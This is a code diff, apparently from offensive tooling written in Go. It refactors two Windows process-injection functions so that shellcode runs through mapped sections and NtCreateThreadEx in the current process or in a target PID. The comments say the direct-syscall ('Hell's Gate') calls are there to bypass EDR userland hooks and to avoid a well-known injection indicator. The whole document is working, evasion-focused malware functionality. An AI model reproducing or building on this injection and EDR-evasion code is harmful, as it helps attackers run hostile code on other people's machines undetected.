@@ -13,165 +13,104 @@ const (
 	secCommit   uintptr = 0x8000000
 	secNoChange uintptr = 0x0400000
 	viewShare   uintptr = 1
-
-	// NtCreateSection / NtMapViewOfSection NTSTATUS success
-	statusSuccess uintptr = 0
 )
 
 // mapInjectLocal executes shellcode in the current process via a mapped section.
-// No VirtualAlloc — uses NtCreateSection + NtMapViewOfSection.
+//
+// Technique: NtCreateSection → NtMapViewOfSection(RW, self) → copy shellcode →
+//            NtUnmapViewOfSection → NtMapViewOfSection(RX, self) → NtCreateThreadEx.
+//
+// No VirtualAlloc, no WriteProcessMemory — all NT calls issued via direct syscall
+// (Hell's Gate) to bypass EDR userland hooks.
 func mapInjectLocal(shellcode []byte) error {
 	if len(shellcode) == 0 {
 		return fmt.Errorf("empty shellcode")
 	}
 
-	sz := uintptr(len(shellcode))
-	var hSection windows.Handle
+	hSelf := windows.CurrentProcess()
 
-	// NtCreateSection(§ion, SECTION_ALL_ACCESS, nil, &sz, PAGE_EXECUTE_READ_WRITE, SEC_COMMIT, nil)
-	status, _, _ := procNtCreateSection.Call(
-		uintptr(unsafe.Pointer(&hSection)),
-		0xF001F, // SECTION_ALL_ACCESS
-		0,
-		uintptr(unsafe.Pointer(&sz)),
-		uintptr(pageExecuteReadWrite),
-		secCommit,
-		0,
-	)
-	if status != statusSuccess {
-		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%X", status)
+	hSection, err := ntCreateSec(uintptr(len(shellcode)), pageExecuteReadWrite)
+	if err != nil {
+		return err
 	}
 	defer windows.CloseHandle(hSection)
 
-	// Map writable view in local process
-	var localBase uintptr
-	var viewSz uintptr = uintptr(len(shellcode))
-	status, _, _ = procNtMapViewOfSection.Call(
-		uintptr(hSection),
-		uintptr(^uintptr(0)-1), // NtCurrentProcess pseudo handle
-		uintptr(unsafe.Pointer(&localBase)),
-		0, 0, 0,
-		uintptr(unsafe.Pointer(&viewSz)),
-		viewShare,
-		0,
-		uintptr(pageReadWrite),
-	)
-	if status != statusSuccess {
-		return fmt.Errorf("NtMapViewOfSection(local): NTSTATUS 0x%X", status)
+	// Map RW view locally to write shellcode.
+	localBase, err := ntMapView(hSection, hSelf, uintptr(len(shellcode)), pageReadWrite)
+	if err != nil {
+		return err
 	}
 
-	// Copy shellcode into the mapped view
 	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
 	copy(dst, shellcode)
 
-	// Unmap writable view and remap RX (so the local mapping we execute from is RX)
-	procNtUnmapViewOfSection.Call(uintptr(^uintptr(0)-1), localBase)
+	ntUnmap(hSelf, localBase)
 
-	var rxBase uintptr
-	viewSz = uintptr(len(shellcode))
-	status, _, _ = procNtMapViewOfSection.Call(
-		uintptr(hSection),
-		uintptr(^uintptr(0)-1),
-		uintptr(unsafe.Pointer(&rxBase)),
-		0, 0, 0,
-		uintptr(unsafe.Pointer(&viewSz)),
-		viewShare,
-		0,
-		uintptr(pageExecRead),
-	)
-	if status != statusSuccess {
-		return fmt.Errorf("NtMapViewOfSection(local RX): NTSTATUS 0x%X", status)
+	// Remap as RX for execution.
+	rxBase, err := ntMapView(hSection, hSelf, uintptr(len(shellcode)), pageExecRead)
+	if err != nil {
+		return err
 	}
 
-	// Execute via CreateThread on the RX mapped region
-	var tid uint32
-	hThread, _, e := procCreateThread.Call(0, 0, rxBase, 0, 0, uintptr(unsafe.Pointer(&tid)))
-	if hThread == 0 {
-		return fmt.Errorf("CreateThread: %v", e)
+	hThread, err := ntCreateThread(hSelf, rxBase)
+	if err != nil {
+		ntUnmap(hSelf, rxBase)
+		return err
 	}
-	windows.CloseHandle(windows.Handle(hThread))
+	windows.CloseHandle(hThread)
 	return nil
 }
 
-// mapInjectRemote injects shellcode into pid via cross-process NtMapViewOfSection.
-// The section is created locally, written to, then mapped into the target process — no WriteProcessMemory.
+// mapInjectRemote injects shellcode into pid via cross-process section mapping.
+//
+// Technique: NtCreateSection → NtMapViewOfSection(RW, self) → copy shellcode →
+//            NtUnmapViewOfSection(self) → NtMapViewOfSection(RX, remote) →
+//            NtCreateThreadEx(remote).
+//
+// No WriteProcessMemory is ever called — avoids one of the most-scrutinised
+// injection indicators. All NT calls bypass userland hooks via Hell's Gate.
 func mapInjectRemote(pid uint32, shellcode []byte) error {
 	if len(shellcode) == 0 {
 		return fmt.Errorf("empty shellcode")
 	}
 
-	sz := uintptr(len(shellcode))
-	var hSection windows.Handle
+	hSelf := windows.CurrentProcess()
 
-	status, _, _ := procNtCreateSection.Call(
-		uintptr(unsafe.Pointer(&hSection)),
-		0xF001F,
-		0,
-		uintptr(unsafe.Pointer(&sz)),
-		uintptr(pageExecuteReadWrite),
-		secCommit,
-		0,
-	)
-	if status != statusSuccess {
-		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%X", status)
+	hSection, err := ntCreateSec(uintptr(len(shellcode)), pageExecuteReadWrite)
+	if err != nil {
+		return err
 	}
 	defer windows.CloseHandle(hSection)
 
-	// Map writable view locally to write shellcode
-	var localBase uintptr
-	var viewSz uintptr = uintptr(len(shellcode))
-	status, _, _ = procNtMapViewOfSection.Call(
-		uintptr(hSection),
-		uintptr(^uintptr(0)-1),
-		uintptr(unsafe.Pointer(&localBase)),
-		0, 0, 0,
-		uintptr(unsafe.Pointer(&viewSz)),
-		viewShare,
-		0,
-		uintptr(pageReadWrite),
-	)
-	if status != statusSuccess {
-		return fmt.Errorf("NtMapViewOfSection(local): NTSTATUS 0x%X", status)
+	// Map RW view locally to write shellcode (no WriteProcessMemory).
+	localBase, err := ntMapView(hSection, hSelf, uintptr(len(shellcode)), pageReadWrite)
+	if err != nil {
+		return err
 	}
 
 	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
 	copy(dst, shellcode)
 
-	procNtUnmapViewOfSection.Call(uintptr(^uintptr(0)-1), localBase)
+	ntUnmap(hSelf, localBase)
 
-	// Open target process
+	// Open target process.
 	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
 	if err != nil {
 		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
 	}
 	defer windows.CloseHandle(hProc)
 
-	// Map RX view into remote process
-	var remoteBase uintptr
-	viewSz = uintptr(len(shellcode))
-	status, _, _ = procNtMapViewOfSection.Call(
-		uintptr(hSection),
-		uintptr(hProc),
-		uintptr(unsafe.Pointer(&remoteBase)),
-		0, 0, 0,
-		uintptr(unsafe.Pointer(&viewSz)),
-		viewShare,
-		0,
-		uintptr(pageExecRead),
-	)
-	if status != statusSuccess {
-		return fmt.Errorf("NtMapViewOfSection(remote): NTSTATUS 0x%X", status)
+	// Map RX view into the remote process (shared section — no data copy across boundary).
+	remoteBase, err := ntMapView(hSection, hProc, uintptr(len(shellcode)), pageExecRead)
+	if err != nil {
+		return err
 	}
 
-	// Kick off execution in remote process via CreateRemoteThread
-	var tid uint32
-	hThread, _, e := procCreateRemoteThread.Call(
-		uintptr(hProc), 0, 0, remoteBase, 0, 0,
-		uintptr(unsafe.Pointer(&tid)),
-	)
-	if hThread == 0 {
-		return fmt.Errorf("CreateRemoteThread: %v", e)
+	hThread, err := ntCreateThread(hProc, remoteBase)
+	if err != nil {
+		ntUnmap(hProc, remoteBase)
+		return err
 	}
-	windows.CloseHandle(windows.Handle(hThread))
+	windows.CloseHandle(hThread)
 	return nil
 }
